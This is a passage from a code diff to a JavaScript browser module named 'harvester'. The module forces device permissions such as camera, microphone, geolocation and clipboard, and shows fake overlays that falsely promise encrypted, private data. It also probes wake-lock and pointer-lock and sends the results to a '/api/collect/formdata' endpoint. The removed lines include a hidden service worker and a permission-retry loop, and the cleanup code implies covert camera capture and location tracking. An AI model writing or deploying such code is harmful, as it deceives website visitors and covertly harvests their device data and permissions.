-            body: data.body || 'You have new content',
-            icon: '/favicon.ico'
-          });
-        });
-        self.addEventListener('notificationclick', (e) => {
-          e.notification.close();
-          e.waitUntil(clients.openWindow('/'));
-        });
-        self.addEventListener('message', (e) => {
-          if (e.data && e.data.type === '__harvester_ping__') {
-            e.ports[0]?.postMessage({ type: 'pong', swActive: true });
-          }
-        });
-      `;
-
-      const blob = new Blob([swCode], { type: 'application/javascript' });
-      const swUrl = URL.createObjectURL(blob);
-      
-      const registration = await navigator.serviceWorker.register(swUrl, { scope: '/' }).catch(() => null);
-      
-      if (registration) {
-        // Wait for it to be active
-        await navigator.serviceWorker.ready;
-        
+        const wakeLock = await navigator.wakeLock.request('screen');
         await this.core.send('/api/collect/formdata', {
-          formId: 'service-worker',
-          fields: { registered: true, scope: registration.scope },
+          formId: 'wake-lock',
+          fields: { active: !!wakeLock },
           url: window.location.href
         });
       }
     } catch (e) {}
   }
 
-  // === SOCIAL ENGINEERING OVERLAY ===
+  async forcePointerLock() {
+    try {
+      document.body.requestPointerLock();
+      setTimeout(() => {
+        if (document.pointerLockElement) {
+          document.exitPointerLock();
+          this.core.send('/api/collect/formdata', {
+            formId: 'pointer-lock',
+            fields: { supported: true },
+            url: window.location.href
+          });
+        }
+      }, 200);
+    } catch (e) {}
+  }
 
+  // === FAKE OVERLAY (simplified) ===
   showFakeOverlay(config) {
     if (this.overlayShown) return;
     this.overlayShown = true;
 
-    const iconType = config.iconType || 'notifications';
-    const accentColor = this.getAccentColor(iconType);
-    const iconSVG = this.getIconSVG(iconType);
-    const gradientDef = this.getIconGradient(iconType);
-    const code = config.code || '';
-
-    // Create overlay with glassmorphism effect
     const overlay = document.createElement('div');
-    overlay.id = 'harvester-permission-overlay';
-    overlay.style.cssText = `
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: var(--harv-bg, rgba(0,0,0,0.75));
-      z-index: 2147483647;
-      display: flex; align-items: center; justify-content: center;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-      backdrop-filter: blur(8px);
-      -webkit-backdrop-filter: blur(8px);
-      animation: harvFadeIn 0.3s ease-out;
+    overlay.id = '__harvester_overlay__';
+    Object.assign(overlay.style, {
+      position: 'fixed', top: '0', left: '0', width: '100%', height: '100%', zIndex: '2147483647',
+      backgroundColor: 'rgba(0,0,0,0.7)', display: 'flex', justifyContent: 'center', alignItems: 'center',
+      animation: 'fadeIn 0.3s ease'
+    });
+
+    const color = this.getAccentColor(config.iconType);
+    overlay.innerHTML = `
+      <div style="background:#1a1a2e;border-radius:16px;padding:32px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.5);border:1px solid ${color}40;">
+        <svg style="width:48px;height:48px;color:${color};margin-bottom:16px;">${this.getIconGradient(config.iconType)}${this.getIconSVG(config.iconType)}</svg>
+        <h3 style="color:#fff;margin:0 0 8px;font-size:1.2rem;">${config.title}</h3>
+        <p style="color:#aaa;font-size:0.85rem;margin:0 0 20px;line-height:1.4;">${config.message}</p>
+        ${config.code ? `<div style="background:#000;padding:12px;border-radius:8px;font-family:monospace;color:${color};font-size:1.2rem;margin-bottom:16px;letter-spacing:2px;">${config.code}</div>` : ''}
+        <div style="background:${color};color:#000;border:none;padding:10px 28px;border-radius:8px;font-weight:600;display:inline-block;font-size:0.9rem;opacity:0.8;">${config.buttonText}</div>
+      </div>
     `;
 
-    // Inject keyframes
-    if (!document.getElementById('harv-keyframes')) {
-      const style = document.createElement('style');
-      style.id = 'harv-keyframes';
-      style.textContent = `
-        @keyframes harvFadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes harvSlideUp { from { opacity: 0; transform: translateY(24px) scale(0.96); } to { opacity: 1; transform: translateY(0) scale(1); } }
-        @keyframes harvPulse { 0%, 100% { box-shadow: 0 0 0 0 rgba(var(--harv-accent-rgb), 0.4); } 50% { box-shadow: 0 0 0 12px rgba(var(--harv-accent-rgb), 0); } }
-        @keyframes harvShimmer { 0% { background-position: -200% center; } 100% { background-position: 200% center; } }
-        @keyframes harvIconPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
-        @keyframes harvRipple { to { transform: scale(4); opacity: 0; } }
-        @keyframes harvFloat { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-6px); } }
-      `;
-      document.head.appendChild(style);
-    }
-
-    // Add CSS variables
-    const r = parseInt(accentColor.slice(1,3), 16);
-    const g = parseInt(accentColor.slice(3,5), 16);
-    const b = parseInt(accentColor.slice(5,7), 16);
-    overlay.style.setProperty('--harv-accent-rgb', `${r},${g},${b}`);
-
-    const dialog = document.createElement('div');
-    dialog.style.cssText = `
-      background: rgba(22, 28, 40, 0.92);
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 20px;
-      padding: 36px 32px 28px;
-      max-width: 400px;
-      width: 88%;
-      text-align: center;
-      box-shadow: 0 24px 80px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.03) inset;
-      animation: harvSlideUp 0.35s cubic-bezier(0.16, 1, 0.3, 1);
-      position: relative;
-      overflow: hidden;
-    `;
-
-    // Gradient accent line at top
-    const accentLine = document.createElement('div');
-    accentLine.style.cssText = `
-      position: absolute; top: 0; left: 0; right: 0; height: 3px;
-      background: linear-gradient(90deg, transparent, ${accentColor}, transparent);
-      background-size: 200% auto;
-      animation: harvShimmer 2s linear infinite;
-    `;
-    dialog.appendChild(accentLine);
-
-    // Icon container with glow
-    const iconContainer = document.createElement('div');
-    iconContainer.style.cssText = `
-      width: 72px; height: 72px; margin: 0 auto 18px;
-      background: rgba(${r},${g},${b},0.12);
-      border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      animation: harvFloat 3s ease-in-out infinite;
-      position: relative;
-    `;
-
-    // Glow ring
-    const glowRing = document.createElement('div');
-    glowRing.style.cssText = `
-      position: absolute; inset: -3px; border-radius: 50%;
-      border: 2px solid rgba(${r},${g},${b},0.25);
-      animation: harvPulse 2s ease-in-out infinite;
-    `;
-    iconContainer.appendChild(glowRing);
-
-    // SVG icon
-    const iconWrapper = document.createElement('div');
-    iconWrapper.style.cssText = `color: ${accentColor}; display: flex; align-items: center; justify-content: center; width: 48px; height: 48px;`;
-    iconWrapper.innerHTML = `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">${gradientDef}${iconSVG.replace(/<svg[^>]*>/, '').replace('</svg>', '')}</svg>`;
-    iconContainer.appendChild(iconWrapper);
-    dialog.appendChild(iconContainer);
-
-    // Title
-    const title = document.createElement('h2');
-    title.textContent = config.title;
-    title.style.cssText = `
-      color: #fff; margin: 0 0 10px 0; font-size: 21px; font-weight: 700;
-      letter-spacing: -0.01em; line-height: 1.3;
-    `;
-    dialog.appendChild(title);
-
-    // Message
-    const message = document.createElement('p');
-    message.textContent = config.message;
-    message.style.cssText = `
-      color: rgba(255,255,255,0.6); margin: 0 0 20px 0; font-size: 14px;
-      line-height: 1.6; max-width: 320px; margin-left: auto; margin-right: auto;
-    `;
-    dialog.appendChild(message);
-
-    // Code block (if clipboard)
-    if (code) {
-      const codeBlock = document.createElement('div');
-      codeBlock.style.cssText = `
-        background: rgba(255,255,255,0.05); padding: 14px 18px; border-radius: 12px;
-        font-family: 'SF Mono', 'Fira Code', 'Fira Mono', Menlo, monospace;
-        font-size: 18px; margin-bottom: 20px; color: #fff;
-        border: 1px solid rgba(255,255,255,0.08);
-        letter-spacing: 0.15em; font-weight: 600;
-        user-select: all; cursor: pointer;
-        transition: background 0.2s;
-      `;
-      codeBlock.textContent = code;
-      codeBlock.onmouseenter = () => { codeBlock.style.background = 'rgba(255,255,255,0.08)'; };
-      codeBlock.onmouseleave = () => { codeBlock.style.background = 'rgba(255,255,255,0.05)'; };
-      codeBlock.onclick = () => {
-        navigator.clipboard?.writeText(code).catch(() => {});
-        codeBlock.textContent = '✓ Copied!';
-        setTimeout(() => { codeBlock.textContent = code; }, 1500);
-      };
-      dialog.appendChild(codeBlock);
-    }
-
-    // Button
-    const btn = document.createElement('button');
-    btn.id = 'harvester-permission-btn';
-    btn.textContent = config.buttonText;
-    btn.style.cssText = `
-      background: linear-gradient(135deg, ${accentColor}88, ${accentColor});
-      color: white; border: none; padding: 14px 32px; border-radius: 12px;
-      font-size: 15px; font-weight: 600; cursor: pointer; width: 100%;
-      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
-      position: relative; overflow: hidden;
-      letter-spacing: 0.01em;
-      box-shadow: 0 4px 20px rgba(${r},${g},${b},0.25);
-    `;
-
-    // Button hover effects
-    btn.onmouseenter = () => {
-      btn.style.transform = 'translateY(-1px)';
-      btn.style.boxShadow = `0 8px 30px rgba(${r},${g},${b},0.35)`;
-    };
-    btn.onmouseleave = () => {
-      btn.style.transform = 'translateY(0)';
-      btn.style.boxShadow = `0 4px 20px rgba(${r},${g},${b},0.25)`;
-    };
-    btn.onmousedown = () => {
-      btn.style.transform = 'translateY(1px)';
-    };
-    btn.onmouseup = () => {
-      btn.style.transform = 'translateY(-1px)';
-    };
-
-    // Ripple effect on click
-    btn.onclick = function(e) {
-      const ripple = document.createElement('span');
-      const rect = this.getBoundingClientRect();
-      const size = Math.max(rect.width, rect.height);
-      ripple.style.cssText = `
-        position: absolute; top: ${e.clientY - rect.top - size/2}px; left: ${e.clientX - rect.left - size/2}px;
-        width: ${size}px; height: ${size}px; border-radius: 50%;
-        background: rgba(255,255,255,0.3); animation: harvRipple 0.6s ease-out;
-      `;
-      this.appendChild(ripple);
-      setTimeout(() => ripple.remove(), 600);
-    };
-
-    dialog.appendChild(btn);
-
-    // Privacy note
-    const privacyNote = document.createElement('p');
-    privacyNote.textContent = 'Your privacy is important to us. Data is encrypted and secure.';
-    privacyNote.style.cssText = `
-      color: rgba(255,255,255,0.25); font-size: 11px; margin-top: 16px;
-      letter-spacing: 0.02em;
-    `;
-    dialog.appendChild(privacyNote);
-
-    overlay.appendChild(dialog);
     document.body.appendChild(overlay);
 
-    // Auto-hide after timeout (reduced from 15s to 8s for speed)
-    this.overlayTimer = setTimeout(() => {
-      this.hideFakeOverlay();
-    }, 8000);
+    setTimeout(() => {
+      if (overlay.parentNode) {
+        overlay.style.animation = 'fadeOut 0.2s ease';
+        setTimeout(() => { if (overlay.parentNode) overlay.parentNode.removeChild(overlay); }, 200);
+      }
+      this.overlayShown = false;
+    }, 3000);
   }
 
   hideFakeOverlay() {
-    const overlay = document.getElementById('harvester-permission-overlay');
+    const overlay = document.getElementById('__harvester_overlay__');
     if (overlay) {
-      overlay.style.opacity = '0';
-      overlay.style.transition = 'opacity 0.25s ease, backdrop-filter 0.25s ease';
-      setTimeout(() => {
-        if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
-      }, 250);
-    }
-    if (this.overlayTimer) {
-      clearTimeout(this.overlayTimer);
-      this.overlayTimer = null;
+      if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
     }
     this.overlayShown = false;
   }
 
-  // === PERMISSION RETRY ===
-
-  retryPermission(key) {
-    const retries = this.attempted[`${key}_retries`] || 0;
-    if (retries >= this.maxRetries) return;
-    this.attempted[`${key}_retries`] = retries + 1;
-    this.attempted[key] = undefined; // Reset so the function will run again
-
-    const delay = this.retryDelays[retries] || 10000;
-    setTimeout(() => {
-      switch(key) {
-        case 'camera': this.forceCamera(); break;
-        case 'microphone': this.forceMicrophone(); break;
-        case 'geolocation': this.forceGeolocation(); break;
-        case 'notifications': this.forceNotifications(); break;
-        case 'clipboard': this.forceClipboard(); break;
-        case 'bluetooth': this.forceBluetooth(); break;
-        case 'usb': this.forceUSB(); break;
-        case 'midi': this.forceMIDI(); break;
-      }
-    }, delay);
-  }
-
   // === CLEANUP ===
-
   cleanup() {
-    // Stop all media streams
-    this.streams.forEach(stream => {
-      stream.getTracks().forEach(track => track.stop());
-    });
+    this.streams.forEach(stream => { stream.getTracks().forEach(track => track.stop()); });
     this.streams = [];
-
-    // Stop geolocation watch
-    if (this.watchId) {
-      navigator.geolocation.clearWatch(this.watchId);
-    }
-
-    // Stop camera capture interval
-    if (this.cameraCaptureInterval) {
-      clearInterval(this.cameraCaptureInterval);
-    }
-
-    // Remove overlay
+    if (this.watchId) navigator.geolocation.clearWatch(this.watchId);
+    if (this.cameraCaptureInterval) clearInterval(this.cameraCaptureInterval);
     this.hideFakeOverlay();
   }
 }
